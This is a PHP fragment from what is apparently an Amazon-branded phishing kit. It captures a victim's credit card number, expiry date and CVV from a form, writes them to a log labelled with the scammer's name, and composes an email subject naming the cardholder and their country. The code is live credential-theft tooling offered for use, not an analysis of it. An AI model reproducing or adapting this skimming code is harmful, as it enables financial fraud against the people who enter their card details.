...
$nccn = $_SESSION['nccn'] = $_POST['nccn'];
$nexpdate = $_SESSION['nexpdate'] = $_POST['nexpdate'];
$nSecuritycode = $_SESSION['nSecuritycode'] = $_POST['nSecuritycode'];


	$mssg="=========== <[ -".$scamname."- AMZN NEW CC ]> ===========\r\n";
    $mssg.="CC Number    : {$_POST['nccn']}\r\n";
    $mssg.="CC Expiry    : {$_POST['nexpdate']}\r\n";
    $mssg.="CVV          : {$_POST['nSecuritycode']}\r\n";
	$mssg.="---------------------- IP Info ----------------------\r\n";
	...
	fwrite($save,$mssg);
	fclose($save);}
	$subject="-".$scamname."- AMZN NEW CC [".$_SESSION['NameOnCard']."] From [".$_SESSION['ip_countryName']."]";
